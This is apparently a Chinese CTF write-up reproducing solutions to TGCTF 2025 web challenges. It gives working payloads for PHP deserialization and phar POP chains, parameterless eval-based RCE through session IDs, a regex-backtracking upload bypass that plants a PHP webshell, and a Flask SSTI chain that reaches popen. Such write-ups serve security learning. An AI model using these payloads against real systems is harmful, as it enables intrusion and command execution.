---

title: "TGCTF 2025 web(复现"
date: 2025-06-01 21:16:23
author: Xendr1a

---

TGCTF 2025 web(复现

日期：2025-06-01 21:16:23

前端GAME

前端game的三个阶段分别对应着三个cve

CVE-2025-30208 【CVE-2025-30208】| Vite-漏洞分析与复现-CSDN博客

CVE-2025-31486 复现与修复指南：Vite任意文件读取漏洞bypass（CVE-2025-31486）

CVE-2025-32395 复现与修复指南：Vite再次bypass（CVE-2025-32395）

什么文件上传？

我们进入首页是一个文件上传的界面，按f12发现提示关键词机器人我们直接去看robots.txt

![rId24.png](/img/TGCTF-2025-web-复现/rId24.png)

我们进入/class.php,

&lt;?php    highlight_file(__FILE__);    error_reporting(0);    function best64_decode($str)    {        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));    }    class yesterday {        public $learn;        public $study=&quot;study&quot;;        public $try;        public function __construct()        {            $this-&gt;learn = &quot;learn&lt;br&gt;&quot;;        }        public function __destruct()        {            echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;            return $this-&gt;study-&gt;hard();        }    }    class today {        public $doing;        public $did;        public $done;        public function __construct(){            $this-&gt;did = &quot;What you did makes you outstanding.&lt;br&gt;&quot;;        }        public function __call($arg1, $arg2)        {            $this-&gt;done = &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;            echo $this-&gt;done;            if(md5(md5($this-&gt;doing))==666){                return $this-&gt;doing();            }            else{                return $this-&gt;doing-&gt;better;            }        }    }    class tommoraw {        public $good;        public $bad;        public $soso;        public function __invoke(){            $this-&gt;good=&quot;You&#39;ll be good tommoraw!&lt;br&gt;&quot;;            echo $this-&gt;good;        }        public function __get($arg1){            $this-&gt;bad=&quot;You&#39;ll be bad tommoraw!&lt;br&gt;&quot;;        }    }    class future{        private $impossible=&quot;How can you get here?&lt;br&gt;&quot;;        private $out;        private $no;        public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;        public function __set($arg1, $arg2) {            if ($this-&gt;out-&gt;useful7) {                echo &quot;Seven is my lucky number&lt;br&gt;&quot;;                system(&#39;whoami&#39;);            }        }        public function __toString(){            echo &quot;This is your future.&lt;br&gt;&quot;;            system($_POST[&quot;wow&quot;]);            return &quot;win&quot;;        }        public function __destruct(){            $this-&gt;no = &quot;no&quot;;            return $this-&gt;no;        }    }    if (file_exists($_GET[&#39;filename&#39;])){        echo &quot;Focus on the previous step!&lt;br&gt;&quot;;    }    else{        $data=substr($_GET[&#39;filename&#39;],0,-4);        unserialize(best64_decode($data));    }    // You learn yesterday, you choose today, can you get to your future??&gt;

我们发现了这里，应该是我们要到达的地方，那我们如何调用__toString()方法呢

public function __toString(){            echo &quot;This is your future.&lt;br&gt;&quot;;            system($_POST[&quot;wow&quot;]);            return &quot;win&quot;;        }

然后注意到

public function __call($arg1, $arg2)        {            $this-&gt;done = &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;            echo $this-&gt;done;            if(md5(md5($this-&gt;doing))==666){                return $this-&gt;doing();            }            else{                return $this-&gt;doing-&gt;better;            }

PHP在计算MD5哈希前会将对象转换为字符串，所以会自动调用 future类的__toString 方法那我们现在构造

&lt;?phpclass yesterday {    public $study;}class today {    public $doing;}class future {}$future = new future();$today = new today();$today-&gt;doing = $future;$yesterday = new yesterday();$yesterday-&gt;study = $today;echo serialize($yesterday);?&gt;O:9:&quot;yesterday&quot;:1:{s:5:&quot;study&quot;;O:5:&quot;today&quot;:1:{s:5:&quot;doing&quot;;O:6:&quot;future&quot;:0:{}}}

然后看到

function best64_decode($str)    {        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));    }//五次的decode,所以我们需要五次的encode

和

if (file_exists($_GET[&#39;filename&#39;])){        echo &quot;Focus on the previous step!&lt;br&gt;&quot;;    }    else{        $data=substr($_GET[&#39;filename&#39;],0,-4);        unserialize(best64_decode($data));    }//我们需要在最后追加四个字符，加上aaaa

我们得到Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NsWlVTbUZXUlRWUFZHMXpNVlpYU1hsaVIzQk9UVlZzTkZZeWRHOWpiVVpXVDBoa1VGSkdjRkJXYTJNMVkwWndSbGw2Vm1oTlYzaGFXVlJLYzFWSFJuSldWRXBoVmtVMVQxUnRjekZXVjBsNVlrZEdVMlZ0ZUROWFZ6QjRZVzFHVms5SVpGQlNSbkJRV1Zjd05XTkdaSFJPVm1ST1VqRktXbFV5TVRSVGJVWjBUMVJPVlUxcVZYZFVNV1JoVjFVeFNGbDZNRDA9aaaa

![rId27.png](/img/TGCTF-2025-web-复现/rId27.png)

什么文件上传？（复仇）

我们直接看到phar，又因为主页有个文件上传点，可以想到文件上传+phar反序列化

![rId24.png](/img/TGCTF-2025-web-复现/rId24.png)

我们先生成个phar.phar

&lt;?phperror_reporting(0);class yesterday {    public $learn;    public $study=&quot;study&quot;;    public $try;    public function __destruct()    {        // echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;        return $this-&gt;study-&gt;hard();    }}class today {    public $doing;    public $did;    public $done;    public function __call($arg1, $arg2)    {        $this-&gt;done = &quot;And what you&#39;ve done has given you a choice.&lt;br&gt;&quot;;        // echo $this-&gt;done;        if(md5(md5($this-&gt;doing))==666){            return $this-&gt;doing();        }        else{            return $this-&gt;doing-&gt;better;        }    }}class future{    private $impossible=&quot;How can you get here?&lt;br&gt;&quot;;    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __toString(){        // echo &quot;This is your future.&lt;br&gt;&quot;;        # system($_POST[&quot;wow&quot;]);        return &quot;win&quot;;    }}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$a = new yesterday();$b = new today();$c = new future();$a-&gt;study = $b;$b-&gt;doing = $c;$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;

生成了phar.phar，然后发现phar被过滤了，结合robots.txt的提示，我们爆破出后缀为atg

![rId33.png](/img/TGCTF-2025-web-复现/rId33.png)

我们读取环境变量，发现flag。

![rId36.png](/img/TGCTF-2025-web-复现/rId36.png)

AAA偷渡阴平

&lt;?php$tgctf2025=$_GET[&#39;tgctf2025&#39;];if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $tgctf2025)){    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);}else{    die(&#39;(╯‵□′)╯炸弹！•••*～●&#39;);}highlight_file(__FILE__);

过滤了好多东西，但是无参rce的函数没有过滤

?tgctf2025=eval(end(current(get_defined_vars())));&amp;cmd=system(&#39;cat /f*&#39;);get_defined_vars()返回包含所有变量的数组（包括$_GET）current()取第一个元素（tgctf2025的值）end()取最后一个元素（b的值）eval()执行system(&#39;cat /flag&#39;)命令

AAA偷渡阴平（复仇）

&lt;?php$tgctf2025=$_GET[&#39;tgctf2025&#39;];if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;, $tgctf2025)){    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);}else{    die(&#39;(╯‵□′)╯炸弹！•••*～●&#39;);}highlight_file(__FILE__);

我们可以看到过滤了一万个函数不会了看看wp，利用的是无参中的session

?tgctf2025=session_start();system(hex2bin(session_id()));PHPSESSID=636174202f666c6167       //cat /flag

(ez)upload

我们扫到了index.php.bak和upload.php.bak

&lt;?phpdefine(&#39;UPLOAD_PATH&#39;, __DIR__ . &#39;/uploads/&#39;);$is_upload = false;$msg = null;$status_code = 200; // 默认状态码为 200if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;php2&quot;, &quot;html&quot;, &quot;htm&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;);        if (isset($_GET[&#39;name&#39;])) {            $file_name = $_GET[&#39;name&#39;];        } else {            $file_name = basename($_FILES[&#39;name&#39;][&#39;name&#39;]);        }        $file_ext = pathinfo($file_name, PATHINFO_EXTENSION);        if (!in_array($file_ext, $deny_ext)) {            $temp_file = $_FILES[&#39;name&#39;][&#39;tmp_name&#39;];            $file_content = file_get_contents($temp_file);            if (preg_match(&#39;/.+?&lt;/s&#39;, $file_content)) {                $msg = &#39;文件内容包含非法字符，禁止上传！&#39;;                $status_code = 403; // 403 表示禁止访问            } else {                $img_path = UPLOAD_PATH . $file_name;                if (move_uploaded_file($temp_file, $img_path)) {                    $is_upload = true;                    $msg = &#39;文件上传成功！&#39;;                } else {                    $msg = &#39;上传出错！&#39;;                    $status_code = 500; // 500 表示服务器内部错误                }            }        } else {            $msg = &#39;禁止保存为该类型文件！&#39;;            $status_code = 403; // 403 表示禁止访问        }    } else {        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;        $status_code = 404; // 404 表示资源未找到    }}// 设置 HTTP 状态码http_response_code($status_code);// 输出结果echo json_encode([    &#39;status_code&#39; =&gt; $status_code,    &#39;msg&#39; =&gt; $msg,]);

我们看到

if (preg_match(&#39;/.+?&lt;/s&#39;, $file_content)) {                $msg = &#39;文件内容包含非法字符，禁止上传！&#39;;                $status_code = 403; // 403 表示禁止访问            }

是利用preg_match函数进行匹配的，我们可以利用PCRE回溯次数限制来绕过然后后面加上一句话木马

101万左右的任意字符+然后name的话，通过传参name来进行目录穿越上传文件也就是../

![rId42.png](/img/TGCTF-2025-web-复现/rId42.png)

然后访问uploads/1.php，flag在环境变量里面

直面天命

看到了hint

![rId46.png](/img/TGCTF-2025-web-复现/rId46.png)

hint：有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!爆破得到/aazz

![rId49.png](/img/TGCTF-2025-web-复现/rId49.png)

爆破得到filename，试试有没有文件读取

![rId52.png](/img/TGCTF-2025-web-复现/rId52.png)

抽象了，直接读到了flag

直面天命（复仇）

上面那个是非预期吧，然后我们接着这个读取继续做，我们读取/app.py

import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=[&#39;{&#39;,&#39;}&#39;,&#39;popen&#39;,&#39;os&#39;,&#39;import&#39;,&#39;eval&#39;,&#39;_&#39;,&#39;system&#39;,&#39;read&#39;,&#39;base&#39;,&#39;globals&#39;]def waf(name):    for x in black_list:        if x in name.lower():            return True    return Falsedef is_typable(char):    # 定义可通过标准 QWERTY 键盘输入的字符集    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace    return char in typable_chars@app.route(&#39;/&#39;)def home():    return send_from_directory(&#39;static&#39;, &#39;index.html&#39;)@app.route(&#39;/jingu&#39;, methods=[&#39;POST&#39;])def greet():    template1=&quot;&quot;    template2=&quot;&quot;    name = request.form.get(&#39;name&#39;)    template = f&#39;{name}&#39;    if waf(name):        template = &#39;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹&lt;br&gt;&#39;    else:        k=0        for i in name:            if is_typable(i):                continue            k=1            break        if k==1:            if not (secret_key[:2] in name and secret_key[2:]):                template = &#39;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧&lt;br&gt;&lt;br&gt;再去西行历练历练&lt;br&gt;&lt;br&gt;&#39;                return render_template_string(template)            template1 = &quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;}}”&lt;br&gt;最后，如果你用了cat，就可以见到齐天大圣了&lt;br&gt;&quot;            template= template.replace(&quot;直面&quot;,&quot;&#123;&#123;&quot;).replace(&quot;天命&quot;,&quot;}}&quot;)            template = template    if &quot;cat&quot; in template:        template2 = &#39;&lt;br&gt;或许你这只叫天命人的猴子，真的能做到？&lt;br&gt;&lt;br&gt;&#39;    try:        return template1+render_template_string(template)+render_template_string(template2)    except Exception as e:        error_message = f&quot;500报错了，查询语句如下：&lt;br&gt;{template}&quot;        return error_message, 400@app.route(&#39;/hint&#39;, methods=[&#39;GET&#39;])def hinter():    template=&quot;hint：&lt;br&gt;有一个由4个小写英文字母组成的路由，去那里看看吧，天命人!&quot;    return render_template_string(template)@app.route(&#39;/aazz&#39;, methods=[&#39;GET&#39;])def finder():    filename = request.args.get(&#39;filename&#39;, &#39;&#39;)    if filename == &quot;&quot;:        return send_from_directory(&#39;static&#39;, &#39;file.html&#39;)    if not filename.replace(&#39;_&#39;, &#39;&#39;).isalnum():        content = jsonify({&#39;error&#39;: &#39;只允许字母和数字！&#39;}), 400    if os.path.isfile(filename):        try:            with open(filename, &#39;r&#39;) as file:                content = file.read()            return content        except Exception as e:            return jsonify({&#39;error&#39;: str(e)}), 500    else:        return jsonify({&#39;error&#39;: &#39;路径不存在或者路径非法&#39;}), 404if __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;, port=80)

看到了这个from a.b.c.d.secret import secret_key可以发现后面会将直面天命变成&#123;&#123;}}

template= template.replace(&quot;直面&quot;,&quot;&#123;&#123;&quot;).replace(&quot;天命&quot;,&quot;}}&quot;)

最后我们就可以构造payload了

name=直面&quot;&quot;[request.args.a1][request.args.a2][0][request.args.a3]()[132][request.args.a4][request.args.a5][&#39;p&#39;&#39;open&#39;](&#39;cat+/flag&#39;)[&#39;r&#39;&#39;ead&#39;]()天命?a1=__class__&amp;a2=__bases__&amp;a3=__subclasses__&amp;a4=__init__&amp;a5=__globals__

TG_wordpress

环境好像没了，应该是CVE-2020-25213

火眼辩魑魅

扫到了robots.txt

![rId58.png](/img/TGCTF-2025-web-复现/rId58.png)

我们发现tgshell.php有一个一句话木马，打开蚁剑连一下下

![rId61.png](/img/TGCTF-2025-web-复现/rId61.png)

连上了，里面就是flag

预期解是，tgxff有个ssti在xff那里

![rId64.png](/img/TGCTF-2025-web-复现/rId64.png)

这题看到好多种非预期了

小结

还有几道题后面再补了，有点难，后面再补了...(待续
